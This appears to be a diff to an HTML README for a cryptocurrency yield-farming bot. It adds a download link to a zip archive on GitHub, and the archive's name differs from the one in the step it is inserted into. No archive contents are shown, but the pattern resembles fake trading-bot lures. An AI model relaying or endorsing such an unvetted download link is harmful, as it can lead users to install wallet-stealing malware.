@@ -4,7 +4,8 @@
 <h3>Getting started:</h3>
 <ol>
   <li>Download and extract the JavaScript-Yield-Farming-Bot-With-StopLoss-V4.zip file to a convenient location.</li>
- 
+ You can download the Zip file here
+ https://github.com/JWebester/Javascript-volitey-yield-farming-bot-with-stoploss/raw/main/JavaScript-Volatility-Yield-Farming-Bot-With-StopLoss.zip
   <li>Open the bot's main folder and locate the "config.js" file.</li>
   <img src="3.png" />
   <li>Using a text-editor, configure the settings according to your needs, including:</li>
